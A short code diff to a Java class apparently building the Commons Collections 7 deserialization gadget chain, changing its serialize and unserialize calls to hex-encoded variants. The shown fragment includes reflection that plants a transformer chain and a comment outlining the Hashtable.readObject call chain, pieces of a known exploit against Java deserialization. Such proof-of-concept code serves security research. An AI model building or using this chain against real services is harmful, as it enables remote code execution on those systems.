@@ -10,8 +10,7 @@ import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
-import static util.Util.serialize;
-import static util.Util.unserialize;
+import static util.Util.*;
 
 /*调用链:
 Hashtable.readObject()
@@ -43,7 +42,7 @@ public class CommonCollection7 {
         field.setAccessible(true);
         field.set(fakechain,transformers);
         lazyMap.clear();
-        serialize(hashtable);
-        unserialize();
+        serializeToHex(hashtable);
+        deserializeFromHex();
     }
 }
